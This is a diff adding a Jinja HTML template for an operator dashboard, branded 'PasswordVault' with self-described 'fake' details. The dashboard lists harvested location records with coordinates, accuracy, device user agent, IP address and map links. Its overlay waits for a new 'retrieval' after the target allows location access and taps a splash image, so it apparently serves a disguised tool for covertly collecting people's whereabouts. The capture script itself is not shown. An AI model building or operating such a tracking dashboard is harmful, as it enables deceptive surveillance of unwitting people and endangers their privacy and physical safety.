@@ -1,0 +1,204 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>PasswordVault - Saved Locations</title>
+    <!-- Tailwind CDN for quick styling -->
+    <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+      /* small fallback spinner animation used in the loadingOverlay */
+      @keyframes spin { to { transform: rotate(360deg); } }
+      /* footer height: use fixed px values for predictable spacing */
+      :root{ --pv-footer-h-px: 405px; }
+      @media (max-width: 640px) {
+        :root{ --pv-footer-h-px: 270px; }
+        #map { height: 270px !important; }
+        #loadingOverlay { height: 270px !important; }
+      }
+  /* small UI helpers */
+      /* toast */
+      .pv-toast { position: fixed; left: 50%; transform: translateX(-50%); bottom: 20vh; background: rgba(15,23,42,0.95); color: #fff; padding: 8px 12px; border-radius: 8px; box-shadow: 0 6px 18px rgba(2,6,23,0.4); opacity: 0; pointer-events: none; transition: opacity 0.2s, transform 0.2s; }
+      .pv-toast.show { opacity: 1; transform: translateX(-50%) translateY(-8px); pointer-events: auto; }
+  /* when map is in-flow, don't reserve bottom padding */
+  .content-with-footer{ padding-bottom: 0; }
+  /* container for the in-flow map/footer */
+  .map-footer-container{ position: relative; margin-top: 1.25rem; }
+  /* footer visual separation */
+  #map { box-shadow: 0 -8px 18px rgba(2,6,23,0.08); border-top: 1px solid rgba(15,23,42,0.04); }
+  /* table alignment helpers */
+  .table-fixed { table-layout: fixed; }
+  .table-fixed th, .table-fixed td { vertical-align: middle; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .table-fixed th:nth-child(1), .table-fixed td:nth-child(1) { width: 48px; }
+  .table-fixed th:nth-child(2), .table-fixed td:nth-child(2) { width: 170px; }
+  .table-fixed th:nth-child(3), .table-fixed td:nth-child(3) { width: 120px; }
+  .table-fixed th:nth-child(4), .table-fixed td:nth-child(4) { width: 120px; }
+  .table-fixed th:nth-child(5), .table-fixed td:nth-child(5) { width: 84px; }
+  .table-fixed th:nth-child(6), .table-fixed td:nth-child(6) { width: 380px; }
+  .table-fixed th:nth-child(7), .table-fixed td:nth-child(7) { width: 160px; }
+  /* modernized table look */
+  /* use normal collapsed table so headers and body align perfectly */
+  .pv-table { border-collapse: collapse; }
+  .pv-table thead th { position: sticky; top: 0; background: linear-gradient(180deg,#ffffff,#f8fafc); backdrop-filter: blur(4px); z-index: 10; border-bottom: 1px solid rgba(2,6,23,0.06); }
+  /* ensure padding/box-model is identical so header and body widths match */
+  .pv-table th, .pv-table td { box-sizing: border-box; }
+  /* row visuals: keep simple white rows with subtle separation */
+  .pv-row { background: #fff; }
+  .pv-row td { padding-top: 0.75rem; padding-bottom: 0.75rem; }
+  .pv-table tbody tr + tr td { border-top: 1px solid rgba(2,6,23,0.04); }
+  .coords { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace; font-size: 13px; color:#0b2540 }
+  .badge-acc { display:inline-block; padding:4px 8px; border-radius:999px; font-weight:700; font-size:12px; background:#eef2ff; color:#3730a3 }
+  .action-btn { border:1px solid rgba(2,6,23,0.06); background:#fafafa; padding:6px 8px; border-radius:8px; font-size:12px; }
+  .action-btn:hover { background:#f0f4ff; }
+  .device-td { color:#0f172a; font-size:13px; }
+  .device-td [title] { cursor: help; }
+    </style>
+  </head>
+  <body class="bg-slate-50 min-h-screen text-slate-800" data-wait-for-new="{{ '1' if session.get('wait_for_new') else '0' }}" data-newest-base="{{ session.get('meta_newest_base', '') }}">
+    <div class="max-w-7xl mx-auto px-4 py-6 content-with-footer">
+      <!-- Overlay shown when we should wait for a new data.json record (after consent) -->
+      <div id="pvOverlay" style="position:fixed; inset:0; background:rgba(255,255,255,0.98); z-index:2000; display:none; align-items:center; justify-content:center;">
+        <div style="text-align:center; max-width:520px; margin:0 auto;">
+          <div style="width:84px;height:84px;border-radius:12px;background:linear-gradient(180deg,#eef2ff,#e6f0ff);display:inline-flex;align-items:center;justify-content:center;box-shadow:0 12px 40px rgba(2,6,23,0.08);">
+            <div style="width:44px;height:44px;border-radius:999px;border:6px solid #cfe0ff;border-top-color:#2b8cff; animation:spin 1s linear infinite;"></div>
+          </div>
+          <div style="margin-top:18px;font-size:18px;font-weight:600;color:#0f172a">Waiting for a PasswordVault Retrieval…</div>
+          <div style="margin-top:8px;color:#475569;font-size:13px">PasswordVault will appear here once a retrieval is success. Please allow location in your device and tap the splash image to send one.</div>
+          <div style="margin-top:14px;"><button id="pvOverlayCancel" class="px-4 py-2 bg-slate-100 rounded">Thank You</button></div>
+        </div>
+      </div>
+      <header class="mb-6 rounded-lg overflow-hidden shadow-sm">
+        <div class="bg-gradient-to-r from-indigo-500 via-sky-500 to-emerald-400 p-4 text-white flex items-center justify-between gap-4">
+          <div class="flex items-center gap-4">
+            <!-- small logo -->
+            <div class="flex items-center justify-center w-12 h-12 rounded-md bg-white/10">
+              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <path d="M3 12h18M12 3v18" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" />
+              </svg>
+            </div>
+            <div>
+              <div class="text-lg font-semibold">PasswordVault</div>
+              <div class="text-xs opacity-90">Saved locations <span class="inline-block bg-white/20 px-2 py-0.5 rounded ml-2">{{ total }}</span></div>
+            </div>
+          </div>
+          <div class="flex items-center gap-4">
+            <div id="status" class="flex items-center gap-2 text-sm">
+              <span class="w-3 h-3 rounded-full bg-green-300 animate-pulse" style="box-shadow:0 0 8px rgba(72,187,120,0.6)"></span>
+              <span class="font-medium">Ready</span>
+            </div>
+            <a href="/logout" class="inline-flex items-center px-4 py-2 bg-white text-indigo-600 rounded-md text-sm font-medium">Logout</a>
+          </div>
+        </div>
+      </header>
+
+      <section class="bg-white shadow rounded-lg overflow-hidden">
+        <!-- small centered video above the table -->
+        <div class="py-4 flex justify-center">
+          <iframe width="320" height="180" src="https://www.youtube.com/embed/Di4O7iLYM5g?si=-5ahLN2HgFJVSyXW&autoplay=1&mute=1" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen class="rounded-md shadow-sm" style="max-width:100%; height:180px; width:320px;">
+          </iframe>
+        </div>
+        <div class="overflow-x-auto">
+          <table class="min-w-full divide-y divide-slate-200 table-fixed pv-table">
+            <thead class="bg-slate-50">
+              <tr>
+                <th class="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase">#</th>
+                <th class="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase">Timestamp</th>
+                <th class="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase">Lat</th>
+                <th class="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase">Lng</th>
+                <th class="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase">Accuracy</th>
+                <th class="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase">Device</th>
+                <th class="px-4 py-3 text-left text-xs font-medium text-slate-500 uppercase">Link</th>
+              </tr>
+            </thead>
+              <tbody class="bg-transparent">
+              {% for rec in data %}
+              <tr class="pv-row hover:shadow-md" data-lat="{{ rec.lat if rec.lat is not none else '' }}" data-lng="{{ rec.lng if rec.lng is not none else '' }}">
+                <td class="px-4 py-3 text-sm" style="width:48px">{{ loop.index }}</td>
+                <td class="px-4 py-3 text-sm" style="width:170px"><span data-ts="{{ rec.timestamp if rec.timestamp is not none else '' }}" title="{{ rec._pretty_timestamp if rec._pretty_timestamp else '' }}">{{ rec._relative if rec._relative else (rec._pretty_timestamp if rec._pretty_timestamp else (rec.timestamp if rec.timestamp else '-')) }}</span></td>
+                <td class="px-4 py-3 text-sm coords" style="width:120px">{{ rec.lat if rec.lat is not none else '-' }}</td>
+                <td class="px-4 py-3 text-sm coords" style="width:120px">{{ rec.lng if rec.lng is not none else '-' }}</td>
+                <td class="px-4 py-3 text-sm" style="width:84px"><span class="badge-acc">{{ rec.accuracy if rec.accuracy is not none else '-' }}</span></td>
+                <td class="px-4 py-3 text-sm device-td" style="width:380px" title="{{ rec.device.userAgent if rec.device and rec.device.userAgent else '' }}">
+                  <div class="flex items-center gap-2">
+                    <div class="text-sm">{{ rec._os_icon if rec._os_icon else '' }} {{ rec._device_str if rec._device_str else (rec.device.userAgent[:80] if rec.device and rec.device.userAgent else '-') }}</div>
+                  </div>
+                  {% if rec.ip %}
+                    <div class="text-xs text-slate-500 mt-1 coords" style="font-size:12px">{{ rec.ip }}</div>
+                  {% endif %}
+                </td>
+                <td class="px-4 py-3 text-sm" style="width:160px">
+                  <div class="flex items-center gap-2">
+                    {% if rec.google_map_link %}<a href="{{ rec.google_map_link }}" target="_blank" class="action-btn" title="Open in Google Maps">Open</a>{% else %}-{% endif %}
+                  </div>
+                </td>
+              </tr>
+              {% endfor %}
+            </tbody>
+          </table>
+        </div>
+      </section>
+      <!-- pagination controls -->
+      <div class="mt-4 flex flex-col sm:flex-row items-center justify-between gap-3">
+        <div class="text-sm text-slate-600">Showing {{ data|length }} of {{ total }} records</div>
+        <div class="flex items-center gap-2">
+          {% if page > 1 %}
+            <a href="?page={{ page-1 }}" class="px-3 py-1 bg-slate-100 rounded touch-manipulation">← Prev</a>
+          {% else %}
+            <span class="px-3 py-1 text-slate-400">← Prev</span>
+          {% endif %}
+          <div class="flex items-center gap-1">
+            {% for p in range(1, total_pages+1) %}
+              {% if p == page %}
+                <span class="px-3 py-1 bg-indigo-600 text-white rounded">{{ p }}</span>
+              {% else %}
+                <a href="?page={{ p }}" class="px-3 py-1 bg-slate-100 rounded">{{ p }}</a>
+              {% endif %}
+            {% endfor %}
+          </div>
+          {% if page < total_pages %}
+            <a href="?page={{ page+1 }}" class="px-3 py-1 bg-slate-100 rounded touch-manipulation">Next →</a>
+          {% else %}
+            <span class="px-3 py-1 text-slate-400">Next →</span>
+          {% endif %}
+        </div>
+      </div>
+  <!-- toast for small confirmations -->
+  <div id="pvToast" class="pv-toast" role="status" aria-live="polite"></div>
+      <!-- map (card-like, in-flow) -->
+      <section class="mt-6 bg-white shadow rounded-lg overflow-hidden">
+        <div class="px-4 py-4">
+          <div class="text-sm text-slate-600 mb-2">Live map</div>
+          <div id="map" style="width:100%; height:var(--pv-footer-h-px); border-radius:6px; overflow:hidden; box-shadow: inset 0 0 0 1px rgba(2,6,23,0.04);"></div>
+          <div id="loadingOverlay" style="position:absolute; left:0; right:0; top:0; height:var(--pv-footer-h-px); background:rgba(255,255,255,0.9); display:flex; align-items:center; justify-content:center; z-index:1200">
+            <div class="spinner" style="width:48px;height:48px;border-radius:50%;border:6px solid #ddd;border-top-color:#2b8cff;animation:spin 1s linear infinite"></div>
+            <div style="margin-top:12px;color:#333">Loading map, awaiting location…</div>
+          </div>
+        </div>
+      </section>
+    </div>
+
+    <!-- footer with fake PasswordVault details -->
+    <footer class="bg-white border-t mt-6">
+      <div class="max-w-7xl mx-auto px-4 py-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 text-slate-600 text-sm">
+        <div>
+          <div class="font-semibold text-slate-900">PasswordVault</div>
+          <div class="text-xs">Version 0.1.0 • Demo UI</div>
+        </div>
+        <div class="text-xs">
+          <div>Records: <strong class="text-slate-800">{{ total }}</strong></div>
+          <div>Contact: <a href="mailto:admin@example.com" class="text-indigo-600">admin@example.com</a></div>
+        </div>
+        <div class="text-xs text-slate-400">© {{ now.year }} PasswordVault — for demo purposes only</div>
+      </div>
+    </footer>
+
+    {% if google_key %}
+    <script src="https://maps.googleapis.com/maps/api/js?key={{ google_key }}"></script>
+    {% else %}
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    {% endif %}
+    <script>document.body.dataset.google = "{{ '1' if google_key else '0' }}";</script>
+    <script src="/static/main.js"></script>
+    </body>
+  </html>
